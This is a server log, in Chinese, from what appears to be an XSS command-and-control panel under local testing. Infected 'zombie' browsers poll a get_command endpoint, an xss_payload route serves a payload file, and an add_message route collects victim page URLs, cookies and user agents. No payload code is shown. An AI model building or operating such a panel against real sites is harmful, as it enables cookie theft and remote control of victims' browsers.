2025-06-25 00:08:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:54 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:55 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:08:55 | INFO     | control_route.py:26 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-25 00:08:55 | INFO     | control_route.py:44 | add_message() | 消息添加成功，目標IP: None,消息: test,時間: 2025-06-25 00:08:55.637619
2025-06-25 00:08:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0028s) -> 回傳: (<Response 194 bytes [200 OK]>, 200)
2025-06-25 00:08:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:55] "GET /api/control/add_message?message=test HTTP/1.1" 200 -
2025-06-25 00:08:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:56 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:57 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:58 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:59 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:00 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:01 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:02 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:03 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:04 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:05 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:06 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:07 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:08 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:09 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:10 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:11 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:12 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:13 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:14 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:15 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:16 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:17 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:18 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:19 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:20 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:21 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:22 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:23 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:24 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:25 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:31 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:09:31 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:09:31 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:09:31 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:09:31 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:09:31 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:09:31 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:09:31 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:09:31 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:09:31 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:09:31 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:09:31 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:09:31 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-25 00:09:31 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:09:31 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-25 00:09:31 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:09:31 | INFO     | app.py:197 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-25 00:09:31 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:09:31 | INFO     | app.py:211 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-25 00:09:31 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-25 00:09:31 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:09:31 | INFO     | app.py:214 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-25 00:09:31 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-25 00:09:31 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-25 00:09:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0279s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:09:37 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:09:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:09:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:37] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:09:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:09:37 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:09:37 | INFO     | control_route.py:51 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: {"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:09:37.026Z"},時間: 2025-06-25 00:09:37.036001
2025-06-25 00:09:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0069s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:09:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:37] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:09:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:38 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:39 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:40 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:41 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:41] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:09:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:43 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:44 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0019s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:45 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
